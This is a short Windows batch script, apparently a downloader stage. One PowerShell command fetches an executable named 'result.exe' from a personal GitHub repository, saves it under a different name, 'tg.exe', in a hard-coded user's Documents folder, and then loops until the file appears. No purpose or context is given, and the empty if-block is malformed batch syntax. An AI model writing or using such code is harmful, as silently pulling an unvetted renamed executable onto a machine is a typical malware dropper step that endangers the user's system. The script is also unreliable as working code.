PowerShell -Command "Invoke-WebRequest -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\hhaam687\Documents\tg.exe'"

:check
	if "C:\Users\hhaam687\Documents\tg.exe" exist (
	
	) else ( 
		goto check
	)
